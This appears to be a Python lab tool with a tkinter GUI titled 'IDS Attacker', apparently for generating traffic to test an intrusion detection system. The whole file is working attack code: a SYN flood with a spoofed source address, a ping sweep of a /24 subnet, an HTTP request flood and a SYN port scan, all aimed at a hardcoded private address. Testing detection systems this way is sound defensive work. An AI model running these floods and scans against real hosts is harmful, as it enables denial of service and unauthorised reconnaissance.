import tkinter as tk
import requests
from scapy.all import send,sr1
from scapy.layers.inet import IP,TCP,ICMP

# Define the IP and port of the listener
listener_ip = '192.168.0.14'
listener_port = 5123
common_ports = [
    20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 119, 123, 135, 137, 138, 139,
    143, 161, 162, 389, 443, 445, 465, 514, 515, 587, 631, 636, 993, 995, 3306,
    3389, 5432, 5900, 6379, 8080, 8443
]

def send_syn_flood():
    src_ip = '10.0.0.1'
    dst_ip = listener_ip
    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=listener_port, flags='S')
    print(f"Sending packet: {packet.summary()}")
    send(packet, count=100)

def send_ping_sweep():
    for i in range(1, 256):
        dst_ip = f"192.168.0.{i}"
        packet = IP(dst=dst_ip)/ICMP()
        send(packet)

def send_http_flood():
    url = f"http://{listener_ip}:{listener_port}/"
    for _ in range(100):
        try:
            requests.get(url)
        except requests.exceptions.RequestException:
            print("cant send http req (http server close)")
            break

def port_scan():
    for port in common_ports:
        packet = IP(dst=listener_ip)/TCP(dport=port, flags='S')
        response = sr1(packet, timeout=1, verbose=0)
        if response:
            if response.haslayer(TCP) and response[TCP].flags == 'SA':
                print(f"Port {port} is open")
            else:
                print(f"Port {port} is closed")
        else:
            print(f"Port {port} is filtered or not responding")

def attack_callback(attack_type):
    if attack_type == "SYN Flood":
        send_syn_flood()
    elif attack_type == "Ping Sweep":
        send_ping_sweep()
    elif attack_type == "HTTP Flood":
        send_http_flood()
    elif attack_type == "Port Scan":
        port_scan()

# GUI setup
root = tk.Tk()
root.title("IDS Attacker")

tk.Label(root, text="Choose an attack to simulate:").pack(pady=10)

tk.Button(root, text="SYN Flood", command=lambda: attack_callback("SYN Flood")).pack(pady=5)
tk.Button(root, text="Ping Sweep", command=lambda: attack_callback("Ping Sweep")).pack(pady=5)
tk.Button(root, text="HTTP Flood", command=lambda: attack_callback("HTTP Flood")).pack(pady=5)
tk.Button(root, text="Port Scan", command=lambda: attack_callback("Port Scan")).pack(pady=5)

root.mainloop()
